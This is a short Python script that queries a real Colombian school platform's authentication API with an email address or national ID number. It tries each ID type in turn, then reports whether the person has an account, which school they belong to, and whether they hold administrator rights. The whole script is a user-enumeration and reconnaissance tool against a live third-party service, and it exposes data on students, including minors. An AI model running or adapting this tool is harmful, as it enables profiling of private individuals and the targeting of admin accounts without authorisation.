#!/usr/bin/python3
#By: lughz4nn

import sys
import json
import time
import requests

MAIN_URL = 'https://evaback.lyl.com.co:8000/api/authentication/get-user-schools'

def get_data(document):

    headers_config = {
        'origin': 'https://eva.lyl.com.co',
        'referer': 'https://eva.lyl.com.co',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36'
    }

    for td in range(1,4):
        

        if '@' in document:
            data_config = {
                'email': document
            }

        else:
            data_config = {
                'identification_type': str(td),
                'identification_number': document
            }

        r = requests.post(url=MAIN_URL,headers=headers_config,data=data_config).text

        json_data = json.loads(r)

        if json_data['status'] == 0:

            if '@' not in document:
                print('Tipo de documento identificado:', ('cedula' if td == 1 else 'cedula extanjera' if td == 2 else 'tarjeta de identidad'))
            else:
                pass

            admin_user = 'No' if json_data['is_user_admin'] == False else 'Si'
            access_admin = 'No' if json_data['can_access_admin'] == False else 'Si'
    
            aux = json_data['schools']

            aux = aux[0]

            time.sleep(2)

            print('')

            print(f'Informacion de {document}'.center(50,'-'))

            time.sleep(1)

            print(f'''
            Nombre de colegio: {aux['name']}
            ID de colegio: {aux['id']}
            Usuario administrador: {admin_user}
            Tiene acceso administrador: {access_admin}
            ''')
            sys.exit(0)

    print('\nEl documento no existe en la plataforma\n')
    sys.exit(1)

if __name__ == '__main__':

    if len(sys.argv) != 2:
        print('\nError, escribe el numero de documento o email a comprobar\n')
        sys.exit(1)
    else:
        get_data(sys.argv[1])
